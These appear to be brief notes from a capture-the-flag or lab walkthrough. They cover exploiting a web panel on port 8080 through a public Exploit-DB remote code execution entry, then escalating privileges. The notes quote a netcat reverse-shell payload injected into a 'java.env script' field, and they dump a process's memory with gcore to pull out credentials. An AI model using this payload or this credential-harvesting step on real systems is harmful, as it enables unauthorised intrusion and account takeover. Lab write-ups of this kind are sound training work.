

port 8080 has this weird panel 
![[Pasted image 20251229181003.png]]

- checking for cve i found  this Remote Code Execution

- https://www.exploit-db.com/exploits/48654

```txt
In the “java.env script” field, enter any command surrounded by $() or ``, for example, for a simple reverse shell:

    $(/bin/nc -e /bin/sh 10.0.0.64 4444 &)
    Click Commit > All At Once > OK
    The command may take up to a minute to execute.
```


so that is what we did and we got a shell


![[Pasted image 20251229182822.png]]

 - intersting privs for priv esc

![[Pasted image 20251229183316.png]]

![[Pasted image 20251229190144.png]]

so lets search for some intersting running processes 

running linepeas shows all running processes with colors 

![[Pasted image 20251229190335.png]]

`sudo gcore -a 490 `
strings core.490 

![[Pasted image 20251229190220.png]]

ssh didnt work 
we try su

DONE

![[Pasted image 20251229190522.png]]
